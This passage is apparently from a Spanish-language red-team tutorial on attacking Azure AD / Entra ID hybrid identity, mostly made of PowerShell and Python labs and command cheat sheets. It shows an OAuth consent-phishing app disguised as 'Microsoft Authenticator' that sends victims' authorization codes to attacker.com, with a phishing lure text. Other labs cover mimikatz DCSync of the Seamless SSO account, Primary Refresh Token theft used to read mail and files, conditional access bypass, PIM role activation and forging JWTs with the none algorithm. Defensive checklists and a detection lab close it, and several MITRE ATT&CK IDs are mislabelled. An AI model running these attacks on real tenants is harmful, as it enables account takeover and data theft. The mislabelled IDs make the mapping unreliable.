                tokens[name] = token['access_token']
                print(f"[+] Token obtenido para {name}")
            else:
                print(f"[-] Error obteniendo token para {name}: {token.get('error_description', 'unknown')}")
        return tokens

## 17. Recursos

### Herramientas
- **AADInternals:** https://github.com/Gerenios/AADInternals
- **ROADtools:** https://github.com/dirkjanm/ROADtools
- **TokenTactics:** https://github.com/fireeye/TokenTactics
- **Stormspotter:** https://github.com/Azure/Stormspotter
- **AzureHound:** https://github.com/BloodHoundAD/AzureHound
- **MSOL Helper:** Herramienta de administracion de Azure AD
- **MFASweep:** https://github.com/dafthack/MFASweep
- **Azure AD Assessment:** https://github.com/Azure/ADAssessment
- **MicroBurst:** https://github.com/NetSPI/MicroBurst
- **PowerZure:** https://github.com/hausec/PowerZure

### Libros y Documentacion
- "Azure AD Attack Paths" - Dirk-jan Mollema
- "Pentesting Azure" - TechSnips
- "Red Team Tactics: Azure AD" - Black Hills Infosec
- Microsoft Identity Platform documentation
- MITRE ATT&CK for Cloud (ID: T1525, T1526, T1527)

### Comandos Rapidos

```bash
# Reconocimiento de tenant
AADInternals:  Invoke-AADIntReconAsOutsider -DomainName target.[com](../raw/w1n-s9bsyst3ms.md#com)
ROADtools:     roadrecon auth --device-code
AzureHound:    azurehound -u user@domain.com -p password -t tenant-id collect

# Obtencion de tokens
TokenTactics:  Get-AzureToken -Resource MicrosoftGraph
AADInternals:  Get-AADIntAccessTokenForAADGraph
ROADtools:     roadtx auth --device-code

# Enumeracion
AADInternals:  Get-AADIntUsers -All $true
AADInternals:  Get-AADIntDirectoryRoleMember -RoleName "Global Administrator"
ROADtools:     roadrecon gather

# Ataques
AADInternals:  Get-AADIntUserPRT -UserPrincipalName user@domain.com -Password pass
TokenTactics:  Get-AzureToken -PRT PRT_VALUE -Context user@domain.com
AADInternals:  New-AADIntConsentLink -AppName "EvilApp" -RedirectUri "[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://attacker.com"
```

### Referencias de Seguridad

```yaml
# Azure AD Security Best Practices
- Habilitar MFA para todos los usuarios administrativos
- Usar acceso condicional con risk-based policies
- Monitorear consent grants sospechosos
- Revisar periodicamente los roles privilegiados
- Deshabilitar [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) [legacy](../raw/l3g4cy-3nt3rpr1s3.md) (POP3, IMAP, SMTP)
- Usar Privileged Identity Management (PIM)
- Revisar aplicaciones con [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) amplios
- Monitorear actividad de usuarios externos (B2B)
- Configurar alertas de riesgo en [azure ad](../raw/hybr1d-1d3nt1ty.md) Identity Protection
- Mantener [azure ad](../raw/hybr1d-1d3nt1ty.md) Connect actualizado
- Usar Password Protection para bloquear passwords debiles
- NO compartir el servidor de [azure](../raw/cl0ud-h4ck1ng.md#azure) AD Connect con otros roles
```

### MITRE ATT&CK for Cloud

```yaml
TA0001 - Initial Access:
  T1525: Internal Spearphishing (consent [phishing](../raw/ph1sh1ng.md))
  T1526: [cloud](../raw/cl0ud-h4ck1ng.md) Service Discovery

TA0003 - Persistence:
  T1098: Account Manipulation (service principal)
  T1136: Create Account (cloud account)
  T1520: Application Access Token ([oauth](../raw/hybr1d-1d3nt1ty.md#oauth) app)

TA0004 - [privilege escalation](../raw/l1n9x-pr1v3sc.md):
  T1548: Abuse Elevation Control Mechanism
  T1078: Valid Accounts (cloud roles)

TA0005 - Defense Evasion:
  T1578: Modify Cloud Compute Infrastructure
  T1207: DCShadow (DirSync)

TA0006 - Credential Access:
  T1528: Steal Application Access Token
  T1552: Unsecured Credentials (managed identities)
  T1606: Forge Web Credentials ([saml](../raw/hybr1d-1d3nt1ty.md#saml) tokens)

TA0007 - Discovery:
  T1069: Permission Groups Discovery
  T1087: Account Discovery
  T1526: Cloud Service Discovery

TA0008 - Lateral Movement:
  T1550: Use Alternate Authentication Material
  T1021: Remote Services (Azure RunCommand)

TA0011 - [command and control](../raw/r3v3rs3-sh3lls.md#command-and-control):
  T1521: Encrypted Channel
  T1572: Protocol Tunneling

TA0010 - Exfiltration:
  T1537: Transfer Data to Cloud Account
  T1567: Exfiltration Over Web Service
```

### Advertencia Etica

> **IMPORTANTE:** Este tutorial es con fines educativos y de investigacion en ciberseguridad. Las tecnicas de ataque a identidad hibrida y Entra ID deben ser utilizadas UNICAMENTE en entornos donde se tenga autorizacion explicita. El uso indebido puede resultar en violaciones de datos, perdida de acceso a sistemas criticos, y acciones legales. Siempre obtene permiso por escrito antes de realizar pruebas de seguridad en cualquier inquilino de Azure AD.

---

> *"Tu identidad es la nueva frontera. En el mundo cloud, tu token vale mas que tu password."*

### Laboratorio 6: Cross-Tenant Attack Lab

```powershell
# Simular ataque cross-tenant
# Tenant A = target (victim)
# Tenant B = attacker

# 1. Crear app en tenant del atacante (Tenant B)
Connect-AzureAD -TenantId "attacker-tenant-id"
$app = New-AzureADApplication -DisplayName "Microsoft Authenticator" `
    -ReplyUrls @("https://attacker.com/callback")

# 2. Configurar permisos peligrosos
$graphResource = Get-AzureADServicePrincipal -Filter "AppId eq '00000003-0000-0000-c000-000000000000'"
$permissions = @(
    @{id="e1fe6dd8-ba31-4d61-89e7-88639da4923c"; type="Scope"},  # Mail.Read
    @{id="741f803b-c850-494e-b5df-cde7c675a1ca"; type="Scope"},  # Mail.Send
    @{id="df021288-bdef-4463-88db-98f22de89214"; type="Role"}    # Directory.ReadWrite.All
)

$req = New-AzureADApplicationRequiredResourceAccess `
    -ResourceAppId $graphResource.AppId `
    -ResourceAccess $permissions

[set](../raw/ph1sh1ng.md#social-engineering-toolkit)-AzureADApplication -ObjectId $app.ObjectId -RequiredResourceAccess $req

# 3. Generar consent link
$consentUrl = "https://login.microsoftonline.com/common/adminconsent"
$params = "client_id=$($app.AppId)&redirect_uri=https://attacker.com/callback&state=hunting"
$fullUrl = "$consentUrl?$params"
Write-Host "Consent URL: $fullUrl"

# 4. Enviar a victima via phishing
# "Su acceso a Office 365 requiere verificacion. Haga clic aqui: $fullUrl"

# 5. Recibir callback con codigo de autorizacion
# (simulado)
function Receive-Callback() {
    # El atacante recibe: ?code=authorization_code&state=hunting
    $authCode = "authorization_code_from_victim"

    # 6. Intercambiar codigo por token
    $tokenEndpoint = "https://login.microsoftonline.com/common/oauth2/token"
    $body = @{
        grant_type = "authorization_code"
        code = $authCode
        redirect_uri = "https://attacker.com/callback"
        client_id = $app.AppId
    }
    $token = Invoke-RestMethod -Method Post -Uri $tokenEndpoint -Body $body
    return $token
}

# 7. Usar token para acceder a datos de la victima
# $token = Receive-Callback
# $headers = @{Authorization = "Bearer $($token.access_token)"}
# Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages" -Headers $headers
```

### Laboratorio 7: Hybrid Identity Pivot

```powershell
# Escenario: Comprometer on-prem, pivotear a cloud

# 1. Obtener hash de AZUREADSSOCC$ (DA required)
Invoke-[mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz) -Command '"lsadump::[dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync) /user:AZUREADSSOCC$"'

# 2. Usar hash con AADInternals para obtener PRT
$[hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) = "HASH_FROM_DCSYNC"
$prt = Get-AADIntUserPRT -UserPrincipalName "admin@domain.com" -Hash $hash

# 3. Usar PRT para obtener tokens
$graphToken = Get-AADIntAccessTokenForPRT -PRT $prt -Resource "https://graph.microsoft.com"
$azToken = Get-AADIntAccessTokenForPRT -PRT $prt -Resource "https://management.azure.com"

# 4. Usar token para acceder a Graph API
$headers = @{Authorization = "Bearer $graphToken"}
$users = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers $headers
$users.value | Select-Object userPrincipalName, displayName

# 5. Pivotear a otros tenants
# Si la victima tiene partners de B2B, podemos pivotear
$partners = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/organization" -Headers $headers
```

### Laboratorio 8: PRT Theft and Abuse

```powershell
# Simular robo de PRT y abuso

# 1. En maquina comprometida, extraer PRT
$prt = Get-AADIntUserPRT -UserPrincipalName "user@domain.com" -Password "password"
$sessionKey = "extracted_session_key"

# 2. Analizar claims del PRT
# El PRT contiene:
# - tid: tenant ID
# - sub: subject (user)
# - amr: authentication methods
# - mfa: MFA status

# 3. Usar PRT para obtener token de Graph
$graphToken = Get-AADIntAccessTokenForPRT -PRT $prt -Resource "https://graph.microsoft.com" -Secret $sessionKey

# 4. Verificar que tenemos acceso
$headers = @{Authorization = "Bearer $graphToken"}
$me = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
Write-Host "Autenticado como: $($me.userPrincipalName)"
Write-Host "Display Name: $($me.displayName)"

# 5. Acceder a recursos sin password
$messages = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages" -Headers $headers
$files = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children" -Headers $headers

# 6. Exchange tokens for other resources
$exToken = Get-AADIntAccessTokenForPRT -PRT $prt -Resource "https://outlook.office.com" -Secret $sessionKey
$spToken = Get-AADIntAccessTokenForPRT -PRT $prt -Resource "https://target.sharepoint.com" -Secret $sessionKey
```

### Glosario de Identidad Hibrida

- **AD FS:** Active Directory Federation Services
- **Entra ID:** Nuevo nombre de Azure Active Directory
- **Hybrid Identity:** Integracion de AD on-prem con Azure AD
- **Managed Identity:** Identidad de Azure para recursos Azure
- **PHS:** Password Hash Sync - sincronizacion de hashes
- **PIM:** Privileged Identity Management
- **PRT:** Primary Refresh Token - token maestro
- **PTA:** Pass-Through Authentication - autenticacion pasante
- **Seamless SSO:** Single Sign-On sin intervencion del usuario
- **Service Principal:** Identidad de aplicacion en Azure AD
- **SAML:** Security Assertion Markup Language
- **Tenant:** Instancia de Azure AD (inquilino)
- **Token Signing Certificate:** Certificado para firmar tokens SAML
- **WS-Fed:** Web Services Federation protocol

### Cheatsheet de Comandos

```bash
# AADInternals
Get-AADIntTenantInfo -Domain domain.com
Get-AADIntUsers -All $true
Get-AADIntDirectoryRoleMember -RoleName "Global Administrator"
Get-AADIntUserPRT -UserPrincipalName user@domain.com -Password pass
Invoke-AADIntReconAsOutsider -DomainName domain.com

# ROADtools
roadrecon auth --device-code
roadrecon gather
roadrecon gui
roadtx auth --prt "PRT_VALUE"

# TokenTactics
Get-AzureToken -Resource MicrosoftGraph
Get-AzureToken -RefreshToken "RT" -Resource MicrosoftGraph
Convert-AzureToken -Token "AT" -TargetResource ExchangeOnline

# AzureHound
azurehound -u user@domain.com -p pass -t tenant-id collect

# Microsoft Graph
Connect-MgGraph -Scopes "User.Read.All"
Get-MgUser -All | Select-Object UserPrincipalName
Get-MgDirectoryRole | Select-Object DisplayName
Get-MgApplication | Select-Object DisplayName, AppId
```

### Recursos Adicionales

**Documentacion Oficial:**
- Microsoft Identity Platform: docs.microsoft.com/en-us/azure/active-directory/develop/
- Azure AD Connect: docs.microsoft.com/en-us/azure/active-directory/hybrid/
- Microsoft Graph: docs.microsoft.com/en-us/graph/

**Herramientas:** AADInternals, ROADtools, TokenTactics, Stormspotter, AzureHound, MSOL Helper, MFASweep, MicroBurst, PowerZure, AzureADAssessment.

**Laboratorios:**
- TryHackMe: Azure AD rooms
- HackTheBox: Cloud machines
- Azure AD Attack Simulation (Microsoft free lab)

**Comunidad:**
- /r/AzureAD
- /r/CloudSecurity
- Azure AD Security mailing list
- Microsoft Security Response Center (MSRC)

## Ataques Adicionales a Entra ID

### Ataque: DCSync en la Nube

```powershell
# DCSync en Azure AD no es posible directamente,
# pero podemos obtener hashes similares via:
# 1. Token theft (PRT theft)
# 2. Password hash sync interception
# 3. Hybrid identity abuse

# Extraer credenciales sincronizadas
# Desde servidor AAD Connect:
$modulePath = "C:\Program Files\Microsoft Azure AD Sync\Bin\ADSync"
Import-Module "$modulePath\ADSync.psd1"
Get-ADSyncConnector | Select-Object Name, ConnectorType

# Dump de credenciales de service account
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Ataque: Azure AD Kerberos Ticket Abuse

```powershell
# Azure AD emite tickets Kerberos para Seamless SSO
# Podemos extraer y reusar estos tickets

# Extraer ticket Kerberos de Azure AD
klist

# El ticket de Azure AD tiene como target:
# azuread-sso.microsoft.com / autologon.microsoftazuread-sso.com

# Exportar ticket
klist -lh 0 | Export-Csv -Path "tickets.csv"

# Reutilizar ticket en otra maquina
# (requiere modificar session de Kerberos)
```

### Ataque: Azure AD Application Impersonation

```powershell
# Si comprometemos una aplicacion con permisos de application (no delegados)
# podemos impersonar cualquier usuario

# 1. Encontrar aplicaciones con Application permissions
Get-AzureADServicePrincipal -All $true | Where-Object {
    $_.AppRoles -match "Directory.ReadWrite.All" -or
    $_.AppRoles -match "User.ReadWrite.All"
} | Select-Object DisplayName, AppId

# 2. Si tenemos client secret de la aplicacion:
$token = Get-AADIntAccessTokenForClient -ClientId "app-id" -ClientSecret "secret" -Resource "https://graph.microsoft.com"

# 3. Usar token para leer datos de cualquier usuario
$headers = @{Authorization = "Bearer $token"}
$users = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers $headers
$users.value | Select-Object userPrincipalName, displayName, mail
```

### Ataque: Conditional Policy Bypass

```powershell
# Bypass de politicas de acceso condicional

# 1. Identificar politicas de acceso condicional
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, State, Conditions, GrantControls

# 2. Tecnicas de bypass:
# - Usar device code flow (no soporta MFA)
# - Usar refresh token viejo (antes de politica)
# - Modificar claims de PRT (agregar mfa claim)
# - Usar puntos finales legacy (autenticacion basica)
# - Usar aplicaciones de confianza (first-party apps)

# 3. Device code bypass
$deviceCode = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body @{
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
}
Write-Host "Usar codigo: $($deviceCode.user_code) en $($deviceCode.verification_uri)"

# 4. Refresh token reuse
# Si el token fue emitido antes de la politica condicional,
# puede seguir siendo valido aunque la politica requiera MFA
```

### Ataque: B2B Guest Enumeration

```powershell
# Enumerar invitados B2B
Get-AzureADUser -All $true | Where-Object { $_.UserType -eq "Guest" } |
    Select-Object DisplayName, UserPrincipalName, UserState, UserStateChangedOn

# Ver recursos accesibles por guests
$guests = Get-AzureADUser -All $true | Where-Object { $_.UserType -eq "Guest" }
foreach ($guest in $guests) {
    Write-Host "Guest: $($guest.UserPrincipalName)"

    # Grupos del guest
    $groups = Get-AzureADUserMembership -ObjectId $guest.ObjectId
    foreach ($group in $groups) {
        Write-Host "  -> Miembro de: $($group.DisplayName)"
    }
}

# Abusar de invitaciones B2B
# Un guest puede invitar a otros guests si tiene permisos
# Guest Inviter role permite invitar sin ser admin
```

### Ataque: Privileged Identity Management (PIM) Abuse

```powershell
# PIM permite activacion temporal de roles privilegiados
# Un atacante con acceso a PIM puede activar roles

# 1. Ver roles elegibles para PIM
Get-AzureADMSPrivilegedRoleDefinition -ProviderId aadRoles -ResourceId $tenantId |
    Select-Object DisplayName, Id

# 2. Ver usuarios elegibles para PIM
Get-AzureADMSPrivilegedRoleAssignment -ProviderId aadRoles -ResourceId $tenantId |
    Select-Object UserId, RoleId, IsActive

# 3. Activar rol PIM
$roleDef = Get-AzureADMSPrivilegedRoleDefinition -ProviderId aadRoles -ResourceId $tenantId |
    Where-Object { $_.DisplayName -eq "Global Administrator" }

$schedule = @{
    Type = "Once"
    Start = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
    End = (Get-Date).AddHours(1).ToString("yyyy-MM-ddTHH:mm:ssZ")
}

$activation = Open-AzureADMSPrivilegedRoleAssignmentRequest `
    -ProviderId aadRoles `
    -ResourceId $tenantId `
    -RoleDefinitionId $roleDef.Id `
    -SubjectId $currentUser.ObjectId `
    -Type "UserAdd" `
    -AssignmentState "Active" `
    -Schedule $schedule `
    -Reason "Hunting exercise"

Write-Host "Rol activado por 1 hora"
```

### Ataque: Azure AD Application Proxy Abuse

```powershell
# Application Proxy expone aplicaciones on-prem via Azure AD
# Un atacante puede usar Application Proxy para acceder a apps internas

# 1. Encontrar aplicaciones publicadas via App Proxy
Get-AzureADApplication | Where-Object { $_.OnPremisesPublishing -ne $null } |
    Select-Object DisplayName, AppId

# 2. Ver conectores de App Proxy
Get-AzureADApplicationProxyConnectorGroup |
    Select-Object Name, ConnectorGroupType, Region

# 3. Si comprometemos un conector, podemos:
# - Interceptar trafico a apps internas
# - Acceder a recursos on-prem sin VPN
# - Pivotear a la red interna

# 4. Conector App Proxy se ejecuta como servicio
Get-Service -Name "Microsoft AAD Application [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) Connector*"
```

## Recursos Finales

### Referencias Rapidas

```bash
# 1. Obtener informacion del tenant (sin credenciales)
Invoke-AADIntReconAsOutsider -DomainName target.com

# 2. Enumeracion con AADInternals
Import-Module AADInternals
Get-AADIntUsers -All $true

# 3. PRT theft
Get-AADIntUserPRT -UserPrincipalName user@domain.com -Password pass

# 4. Token exchange
Get-AADIntAccessTokenForPRT -PRT $prt -Resource "https://graph.microsoft.com"

# 5. Cross-tenant attack
New-AADIntConsentLink -AppName "EvilApp" -RedirectUri "https://attacker.com"

# 6. ROADtools recon
roadrecon auth --device-code
roadrecon gather
roadrecon gui
```

### Vulnerabilidades Comunes en Entornos Hibridos

1. **PTA Agent sin proteccion:** El agente PTA envia credenciales en texto claro
2. **AD FS con certificados debiles:** Token signing certificate expuesto
3. **Seamless SSO account sin control:** AZUREADSSOCC$ puede ser usado para forjar tickets
4. **Azure AD Connect over-privileged:** El conector tiene permisos de DirSync
5. **Consent grants amplios:** Aplicaciones con permisos de lectura/escritura de directorio
6. **B2B sin restricciones:** Guests pueden acceder a recursos sensibles
7. **Managed identities expuestas:** Identidades de VM con permisos peligrosos
8. **Service principals sin secret rotation:** Secrets de aplicaciones nunca rotados
9. **Legacy authentication habilitado:** POP3, IMAP, SMTP auth sin MFA
10. **Conditional access mal configurado:** Politicas que permiten bypass

### Checklist de Seguridad para Identidad Hibrida

```markdown
## Checklist de Seguridad

### [azure ad](../raw/hybr1d-1d3nt1ty.md)
- [ ] MFA habilitado para todos los administradores
- [ ] Acceso condicional configurado con risk policies
- [ ] [legacy](../raw/l3g4cy-3nt3rpr1s3.md) authentication bloqueado
- [ ] Aplicaciones con [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) revisados trimestralmente
- [ ] PIM configurado para roles privilegiados
- [ ] Identity Protection configurado
- [ ] Alertas de riesgo habilitadas
- [ ] Audit logs enviados a SIEM

### [azure ad](../raw/hybr1d-1d3nt1ty.md) Connect
- [ ] Servidor AAD Connect hardening aplicado
- [ ] PTA Agent en servidor dedicado
- [ ] Staging mode para cambios de configuracion
- [ ] Password writeback solo para self-service
- [ ] Device writeback deshabilitado si no se usa

### [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) FS
- [ ] Token signing certificate respaldado offline
- [ ] Extranet lockout configurado
- [ ] Endpoints no seguros deshabilitados
- [ ] AD FS audit habilitado
- [ ] Certificados rotados periodicamente

### Seamless [sso](../raw/hybr1d-1d3nt1ty.md#sso)
- [ ] AZUREADSSOCC$ account monitoreado
- [ ] Kerberos delegation controlado
- [ ] Solo dispositivos unidos a dominio pueden usar SSO
```

> *"La identidad es el nuevo perímetro. En el mundo moderno, no importa qué tan buena sea tu red si tu identidad está comprometida."*

## Ejercicios Avanzados

### Lab: Azure AD Attack Chain

```python
"""
[azure](../raw/cl0ud-h4ck1ng.md#azure) AD attack chain simulation
"""
import requests, json, base64, time

class AzureADAttackChain:
    def __init__(self, tenant_id, client_id, client_secret):
        self.tenant = tenant_id
        self.client = client_id
        self.secret = client_secret
        self.token = None

    def step1_authenticate(self):
        """Paso 1: Obtener token inicial"""
        url = f"[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://login.microsoftonline.[com](../raw/w1n-s9bsyst3ms.md#com)/{self.tenant}/oauth2/token"
        data = {
            "grant_type": "client_credentials",
            "client_id": self.client,
            "client_secret": self.secret,
            "resource": "https://graph.microsoft.com"
        }
        resp = requests.post(url, data=data)
        self.token = resp.json().get('access_token')

    def step2_enumerate_privileged_users(self):
        """Paso 2: Encontrar usuarios privilegiados"""
        headers = {"Authorization": f"Bearer {self.token}"}
        url = "https://graph.microsoft.com/v1.0/directoryRoles"

        roles = requests.get(url, headers=headers).json()
        print(f"[*] Roles encontrados: {len(roles.get('value', []))}")

        for role in roles.get('value', []):
            members_url = f"{url}/{role['id']}/members"
            members = requests.get(members_url, headers=headers).json()
            for member in members.get('value', []):
                print(f"  [+] {role['displayName']}: {member.get('userPrincipalName', member.get('displayName'))}")

    def step3_find_sync_accounts(self):
        """Paso 3: Encontrar cuentas sincronizadas (hibridas)"""
        headers = {"Authorization": f"Bearer {self.token}"}
        url = "https://graph.microsoft.com/v1.0/users?$select=userPrincipalName,onPremisesSecurityIdentifier,onPremisesSyncEnabled,onPremisesLastSyncDateTime"

        users = requests.get(url, headers=headers).json()
        hybrid = [u for u in users.get('value', []) if u.get('onPremisesSecurityIdentifier')]
        print(f"[*] Usuarios hibridos: {len(hybrid)}")
        for u in hybrid:
            print(f"  [+] {u['userPrincipalName']} - Sync: {u.get('onPremisesSyncEnabled')}")

    def step4_find_service_principals(self):
        """Paso 4: Buscar service principals con permisos peligrosos"""
        headers = {"Authorization": f"Bearer {self.token}"}
        url = "https://graph.microsoft.com/v1.0/servicePrincipals"

        sps = requests.get(url, headers=headers).json()
        dangerous_perms = ['Directory.ReadWrite.All', 'User.ReadWrite.All', 'RoleManagement.ReadWrite.Directory']

        for sp in sps.get('value', []):
            app_roles = sp.get('appRoles', [])
            for role in app_roles:
                if role.get('value') in dangerous_perms:
                    print(f"  [!] {sp['displayName']} tiene {role['value']}")

    def step5_check_b2b_guests(self):
        """Paso 5: Enumerar invitados B2B"""
        headers = {"Authorization": f"Bearer {self.token}"}
        url = "https://graph.microsoft.com/v1.0/users?$filter=userType eq 'Guest'"

        guests = requests.get(url, headers=headers).json()
        print(f"[*] Invitados B2B: {len(guests.get('value', []))}")
        for g in guests.get('value', []):
            print(f"  [+] {g['userPrincipalName']} - {g.get('userState', 'active')}")

    def step6_check_conditional_access(self):
        """Paso 6: Revisar politicas de acceso condicional"""
        headers = {"Authorization": f"Bearer {self.token}"}
        url = "https://graph.microsoft.com/beta/identity/conditionalAccess/policies"

        policies = requests.get(url, headers=headers).json()
        print(f"[*] Politicas de acceso condicional: {len(policies.get('value', []))}")
        for p in policies.get('value', []):
            print(f"  {p['displayName']}: {p['state']}")

    def run(self):
        """Ejecutar cadena de ataque completa"""
        print("=== Azure AD Attack Chain ===")
        print("[1] Autenticando...")
        self.step1_authenticate()
        print()
        print("[2] Enumerando usuarios privilegiados...")
        self.step2_enumerate_privileged_users()
        print()
        print("[3] Buscando cuentas hibridas...")
        self.step3_find_sync_accounts()
        print()
        print("[4] Buscando service principals peligrosos...")
        self.step4_find_service_principals()
        print()
        print("[5] Enumerando invitados B2B...")
        self.step5_check_b2b_guests()
        print()
        print("[6] Revisando acceso condicional...")
        self.step6_check_conditional_access()
        print()
        print("[*] Attack chain complete!")

# Ejecutar
# chain = AzureADAttackChain("tenant-id", "client-id", "client-secret")
# chain.run()
```

### Lab: Token Forging and Validation

```python
"""
Token forging and validation lab
"""
import [jwt](../raw/4p1-s3cur1ty.md#jwt), datetime, json

class TokenLab:
    def forge_token(self, [payload](../raw/m3t4spl01t.md#payloads), key, algorithm='HS256'):
        """Forjar un token JWT"""
        token = jwt.encode(payload, key, algorithm=algorithm)
        return token

    def validate_token(self, token, key, algorithms=['HS256']):
        """Validar un token JWT"""
        try:
            payload = jwt.decode(token, key, algorithms=algorithms)
            return {'valid': True, 'payload': payload}
        except jwt.ExpiredSignatureError:
            return {'valid': False, 'error': 'Token expirado'}
        except jwt.InvalidTokenError as e:
            return {'valid': False, 'error': str(e)}

    def analyze_token_structure(self, token):
        """Analizar estructura de un token"""
        parts = token.split('.')
        if len(parts) != 3:
            return {'valid': False, 'error': 'Formato invalido'}

        import base64
        # Fix padding
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

        return {
            'header': header,
            'payload': payload,
            'signature': parts[2]
        }

    def find_weak_signature(self, token, wordlist):
        """Encontrar clave debil usada para firmar token"""
        header = self.analyze_token_structure(token)
        if not header:
            return None

        for word in wordlist:
            try:
                payload = jwt.decode(token, word, algorithms=['HS256'])
                return word
            except:
                continue
        return None

    def forged_token_attack(self, target_user, target_app, tenant_id):
        """Forjar token malicioso con none algorithm"""
        # Ataque: algorithm confusion (none algorithm)
        malicious_payload = {
            "iss": f"https://login.microsoftonline.com/{tenant_id}/v2.0",
            "aud": target_app,
            "sub": target_user,
            "tid": tenant_id,
            "upn": target_user,
            "roles": ["GlobalAdmin"],
            "exp": int((datetime.datetime.utcnow() + datetime.timedelta(hours=1)).timestamp()),
            "nbf": int(datetime.datetime.utcnow().timestamp())
        }

        # Try various attack vectors
        attacks = []

        # 1. None algorithm
        token = jwt.encode(malicious_payload, key='', algorithm='none')
        attacks.append(('none_algorithm', token))

        # 2. Weak HMAC key
        token = jwt.encode(malicious_payload, 'secret', algorithm='HS256')
        attacks.append(('weak_key', token))

        # 3. Algorithm confusion (RS256 vs HS256)
        # Si el servidor espera RS256 pero recibe HS256 con public key
        import [cryptography](../raw/crypt0-f0r-h4ck3rs.md)
        token = jwt.encode(malicious_payload, '-----BEGIN PUBLIC KEY-----\n...', algorithm='HS256')
        attacks.append(('algorithm_confusion', token))

        return attacks

# Ejercicio: Analizar tokens reales de Azure AD
lab = TokenLab()

# 1. Decodificar un token JWT de Azure AD
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20vIiwic3ViIjoibWVAdXNlci5jb20iLCJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwidGlkIjoidGVuYW50LWlkIiwidXBuIjoidXNlckBkb21haW4uY29tIn0"
structure = lab.analyze_token_structure(token)
print(json.dumps(structure, indent=2))

# 2. Verificar si el token ha expirado
# 3. Modificar claims y re-firmar
```

### Lab: MSOL Helper Usage

```powershell
# MSOL Helper es una herramienta para administrar Azure AD
# desde PowerShell, con funciones adicionales para pentesting

# 1. Instalar modulo MSOnline
Install-Module -Name MSOnline -Force

# 2. Conectar
Connect-MsolService

# 3. Comandos utiles
Get-MsolUser -All | Select-Object UserPrincipalName, IsLicensed, StrongAuthenticationMethods
Get-MsolCompanyInformation | Select-Object DisplayName, TechnicalNotificationEmails
Get-MsolDomain | Select-Object Name, Status, Authentication
Get-MsolGroup -All | Select-Object DisplayName, GroupType, Description

# 4. Buscar usuarios sin MFA
Get-MsolUser -All | Where-Object { $_.StrongAuthenticationMethods -eq $null } |
    Select-Object UserPrincipalName, DisplayName

# 5. Buscar usuarios con roles administrativos
Get-MsolRole | ForEach-Object {
    $members = Get-MsolRoleMember -RoleObjectId $_.ObjectId
    foreach ($member in $members) {
        [PSCustomObject]@{
            Role = $_.Name
            User = $member.EmailAddress
        }
    }
}

# 6. Verificar estado de sincronizacion
Get-MsolCompanyInformation | Select-Object DirectorySynchronizationEnabled

# 7. Verificar Password Sync
Get-MsolDirSyncConfiguration | Select-Object PasswordSyncEnabled, LastPasswordSync

# 8. Verificar Seamless SSO
Get-MsolCompanyInformation | Select-Object SeamlessSingleSignOnEnabled

# 9. Dump de configuracion de federacion
Get-MsolDomainFederationSettings -DomainName "federated.domain.com"

# 10. Verificar Azure AD Connect version
Get-MsolDirSyncConfiguration | Select-Object *
```

### Lab: Deteccion de IoCs en Entra ID

```powershell
# Deteccion de indicadores de compromiso en Entra ID

# 1. Logons sospechosos
$signins = Get-AzureADAuditSignInLogs -All $true
$suspicious = $signins | Where-Object {
    $_.Status.ErrorCode -ne 0 -or
    $_.RiskDetail -ne "none" -or
    $_.IsInteractive -eq $false
} | Select-Object UserPrincipalName, CreatedDateTime, AppDisplayName, Status, RiskDetail

$suspicious | Export-Csv -Path "suspicious_logins.csv"

# 2. Nuevos consent grants
$consentGrants = Get-AzureADOAuth2PermissionGrant -All $true
$recentGrants = $consentGrants | Where-Object {
    $_.StartTime -gt (Get-Date).AddDays(-7)
}
foreach ($grant in $recentGrants) {
    Write-Host "Nuevo consentimiento:"
    Write-Host "  Cliente: $($grant.ClientId)"
    Write-Host "  Scope: $($grant.Scope)"
    Write-Host "  Consent Type: $($grant.ConsentType)"
}

# 3. Modificaciones de roles privilegiados
$auditLogs = Get-AzureADAuditDirectoryLogs -All $true
$roleChanges = $auditLogs | Where-Object {
    $_.ActivityDisplayName -match "Add member to role" -or
    $_.ActivityDisplayName -match "Remove member from role"
} | Select-Object ActivityDateTime, ActivityDisplayName, TargetResources, InitiatedBy

$roleChanges | Export-Csv -Path "role_changes.csv"

# 4. Aplicaciones nuevas con permisos amplios
$apps = Get-AzureADApplication -All $true
$newApps = $apps | Where-Object {
    $_.CreatedDateTime -gt (Get-Date).AddDays(-30)
}
foreach ($app in $newApps) {
    $requiredAccess = $app.RequiredResourceAccess
    if ($requiredAccess) {
        foreach ($access in $requiredAccess) {
            if ($access.ResourceAccess -match "Directory.ReadWrite.All" -or
                $access.ResourceAccess -match "Mail.Read") {
                Write-Host "[!] App peligrosa: $($app.DisplayName)"
                Write-Host "    Permisos: $($access.ResourceAccess)"
            }
        }
    }
}

# 5. Actividad de usuarios externos
$guestActivity = Get-AzureADAuditSignInLogs -All $true |
    Where-Object { $_.UserPrincipalName -match "#EXT#" }
